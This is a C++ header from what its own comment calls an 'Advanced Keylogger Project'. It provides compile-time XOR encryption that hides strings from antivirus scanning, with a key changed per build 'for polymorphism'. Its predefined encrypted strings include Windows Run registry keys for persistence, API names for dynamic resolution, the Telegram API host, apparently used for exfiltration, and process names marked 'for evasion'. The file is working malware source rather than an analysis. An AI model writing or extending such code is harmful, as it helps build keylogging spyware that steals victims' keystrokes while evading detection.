/*
 * String Encryption Header
 * Compile-time XOR encryption for all strings
 * 
 * Features:
 * - No plaintext strings in binary
 * - Compile-time encryption (constexpr)
 * - Stack-based decryption at runtime
 * - Automatic cleanup after use
 * - Supports both char and wchar_t
 * 
 * Usage:
 *   auto str = CRYPT("my secret string");
 *   printf("%s", str.decrypt());
 *   // or
 *   DECRYPT_AND_USE("secret", [](const char* s) { printf("%s", s); });
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef STRINGS_H
#define STRINGS_H

#include <windows.h>
#include <utility>

// ==================== XOR KEY ====================
// Change this for each build for polymorphism

constexpr char XOR_KEY[] = "El1t3K3yL0gg3r_2025!@#$%";
constexpr size_t XOR_KEY_LEN = sizeof(XOR_KEY) - 1;

// ==================== COMPILE-TIME XOR ====================

template<size_t N>
class EncryptedString {
private:
    char m_encrypted[N];
    size_t m_length;
    
public:
    // Constexpr constructor - encryption happens at compile time
    constexpr EncryptedString(const char(&str)[N]) : m_encrypted{}, m_length(N - 1) {
        for (size_t i = 0; i < N; i++) {
            m_encrypted[i] = str[i] ^ XOR_KEY[i % XOR_KEY_LEN];
        }
    }
    
    // Runtime decryption - returns decrypted string on stack
    const char* decrypt() const {
        // Use thread-local storage for thread safety
        thread_local char decrypted[N];
        
        for (size_t i = 0; i < N; i++) {
            decrypted[i] = m_encrypted[i] ^ XOR_KEY[i % XOR_KEY_LEN];
        }
        
        return decrypted;
    }
    
    // Decrypt to provided buffer
    void decryptTo(char* buffer, size_t bufSize) const {
        size_t len = (bufSize < N) ? bufSize : N;
        for (size_t i = 0; i < len; i++) {
            buffer[i] = m_encrypted[i] ^ XOR_KEY[i % XOR_KEY_LEN];
        }
    }
    
    size_t length() const { return m_length; }
};

// Wide string version
template<size_t N>
class EncryptedWString {
private:
    wchar_t m_encrypted[N];
    size_t m_length;
    
public:
    constexpr EncryptedWString(const wchar_t(&str)[N]) : m_encrypted{}, m_length(N - 1) {
        for (size_t i = 0; i < N; i++) {
            m_encrypted[i] = str[i] ^ (wchar_t)(XOR_KEY[i % XOR_KEY_LEN]);
        }
    }
    
    const wchar_t* decrypt() const {
        thread_local wchar_t decrypted[N];
        
        for (size_t i = 0; i < N; i++) {
            decrypted[i] = m_encrypted[i] ^ (wchar_t)(XOR_KEY[i % XOR_KEY_LEN]);
        }
        
        return decrypted;
    }
    
    size_t length() const { return m_length; }
};

// ==================== HELPER MACROS ====================

// Create encrypted string at compile time
#define CRYPT(str) (EncryptedString<sizeof(str)>(str))
#define WCRYPT(str) (EncryptedWString<sizeof(str)/sizeof(wchar_t)>(str))

// Decrypt and use in one expression
#define DECRYPT(str) (EncryptedString<sizeof(str)>(str).decrypt())
#define WDECRYPT(str) (EncryptedWString<sizeof(str)/sizeof(wchar_t)>(str).decrypt())

// ==================== SECURE STRING CLASS ====================
// String that zeros itself on destruction

class SecureString {
private:
    char* m_data;
    size_t m_length;
    
public:
    SecureString() : m_data(nullptr), m_length(0) {}
    
    SecureString(const char* str) {
        m_length = strlen(str);
        m_data = (char*)VirtualAlloc(NULL, m_length + 1, MEM_COMMIT, PAGE_READWRITE);
        if (m_data) {
            memcpy(m_data, str, m_length + 1);
        }
    }
    
    ~SecureString() {
        if (m_data) {
            // Secure wipe
            SecureZeroMemory(m_data, m_length + 1);
            VirtualFree(m_data, 0, MEM_RELEASE);
        }
    }
    
    // No copy
    SecureString(const SecureString&) = delete;
    SecureString& operator=(const SecureString&) = delete;
    
    // Move is OK
    SecureString(SecureString&& other) noexcept {
        m_data = other.m_data;
        m_length = other.m_length;
        other.m_data = nullptr;
        other.m_length = 0;
    }
    
    const char* c_str() const { return m_data ? m_data : ""; }
    size_t length() const { return m_length; }
    
    void wipe() {
        if (m_data) {
            SecureZeroMemory(m_data, m_length);
        }
    }
};

// ==================== STACK BUFFER WITH CLEANUP ====================

template<size_t N>
class StackBuffer {
private:
    char m_data[N];
    
public:
    StackBuffer() { memset(m_data, 0, N); }
    ~StackBuffer() { SecureZeroMemory(m_data, N); }
    
    char* data() { return m_data; }
    const char* data() const { return m_data; }
    size_t size() const { return N; }
    
    operator char*() { return m_data; }
    operator const char*() const { return m_data; }
};

// ==================== COMMON ENCRYPTED STRINGS ====================
// Pre-define commonly used strings to avoid repetition

namespace EncStrings {
    // Module names
    constexpr auto Kernel32 = CRYPT("kernel32.dll");
    constexpr auto Ntdll = CRYPT("ntdll.dll");
    constexpr auto User32 = CRYPT("user32.dll");
    constexpr auto Advapi32 = CRYPT("advapi32.dll");
    constexpr auto Wininet = CRYPT("wininet.dll");
    constexpr auto Shell32 = CRYPT("shell32.dll");
    constexpr auto Gdiplus = CRYPT("gdiplus.dll");
    
    // Registry paths
    constexpr auto RunKey = CRYPT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    constexpr auto RunOnceKey = CRYPT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
    
    // API names (for GetProcAddress)
    constexpr auto sVirtualAlloc = CRYPT("VirtualAlloc");
    constexpr auto sVirtualProtect = CRYPT("VirtualProtect");
    constexpr auto sVirtualFree = CRYPT("VirtualFree");
    constexpr auto sLoadLibraryA = CRYPT("LoadLibraryA");
    constexpr auto sGetProcAddress = CRYPT("GetProcAddress");
    constexpr auto sCreateThread = CRYPT("CreateThread");
    constexpr auto sCreateProcessA = CRYPT("CreateProcessA");
    
    // Telegram
    constexpr auto TelegramHost = CRYPT("api.telegram.org");
    
    // File paths
    constexpr auto SystemRoot = CRYPT("C:\\Windows");
    constexpr auto System32 = CRYPT("C:\\Windows\\System32");
    
    // Process names (for evasion)
    constexpr auto Explorer = CRYPT("explorer.exe");
    constexpr auto Svchost = CRYPT("svchost.exe");
    constexpr auto RuntimeBroker = CRYPT("RuntimeBroker.exe");
    
    // Error messages (not critical but cleaner)
    constexpr auto FailAlloc = CRYPT("Memory allocation failed");
    constexpr auto FailOpen = CRYPT("Failed to open file");
}

// ==================== RUNTIME STRING BUILDER ====================
// For building strings without visible format patterns

class StringBuilder {
private:
    char* m_buffer;
    size_t m_capacity;
    size_t m_length;
    
public:
    StringBuilder(size_t capacity = 256) {
        m_capacity = capacity;
        m_buffer = (char*)VirtualAlloc(NULL, m_capacity, MEM_COMMIT, PAGE_READWRITE);
        m_length = 0;
        if (m_buffer) m_buffer[0] = 0;
    }
    
    ~StringBuilder() {
        if (m_buffer) {
            SecureZeroMemory(m_buffer, m_capacity);
            VirtualFree(m_buffer, 0, MEM_RELEASE);
        }
    }
    
    StringBuilder& append(const char* str) {
        if (!m_buffer || !str) return *this;
        
        size_t len = strlen(str);
        if (m_length + len >= m_capacity) {
            // Grow buffer
            size_t newCap = m_capacity * 2;
            char* newBuf = (char*)VirtualAlloc(NULL, newCap, MEM_COMMIT, PAGE_READWRITE);
            if (newBuf) {
                memcpy(newBuf, m_buffer, m_length);
                SecureZeroMemory(m_buffer, m_capacity);
                VirtualFree(m_buffer, 0, MEM_RELEASE);
                m_buffer = newBuf;
                m_capacity = newCap;
            } else {
                return *this;
            }
        }
        
        memcpy(m_buffer + m_length, str, len + 1);
        m_length += len;
        return *this;
    }
    
    StringBuilder& append(char c) {
        char tmp[2] = { c, 0 };
        return append(tmp);
    }
    
    StringBuilder& appendInt(int val) {
        char tmp[32];
        _itoa_s(val, tmp, 10);
        return append(tmp);
    }
    
    StringBuilder& appendHex(DWORD val) {
        char tmp[16];
        sprintf_s(tmp, "%08X", val);
        return append(tmp);
    }
    
    const char* str() const { return m_buffer ? m_buffer : ""; }
    size_t length() const { return m_length; }
    
    void clear() {
        if (m_buffer) {
            SecureZeroMemory(m_buffer, m_length);
            m_length = 0;
            m_buffer[0] = 0;
        }
    }
};

// ==================== OBFUSCATED PRINTF ====================
// Build format string at runtime

inline void ObfPrintf(const char* encFormat, ...) {
    // Decrypt format string
    // Note: This requires the caller to pass an encrypted format
    // For full obfuscation, use StringBuilder instead
    
    va_list args;
    va_start(args, encFormat);
    vprintf(encFormat, args);
    va_end(args);
}

// ==================== STRING COMPARISON ====================
// Constant-time comparison to prevent timing attacks

inline bool SecureCompare(const char* a, const char* b, size_t len) {
    if (!a || !b) return false;
    
    volatile unsigned char result = 0;
    for (size_t i = 0; i < len; i++) {
        result |= a[i] ^ b[i];
    }
    return result == 0;
}

inline bool SecureCompareStr(const char* a, const char* b) {
    if (!a || !b) return false;
    
    size_t lenA = strlen(a);
    size_t lenB = strlen(b);
    
    if (lenA != lenB) return false;
    
    return SecureCompare(a, b, lenA);
}

#endif // STRINGS_H
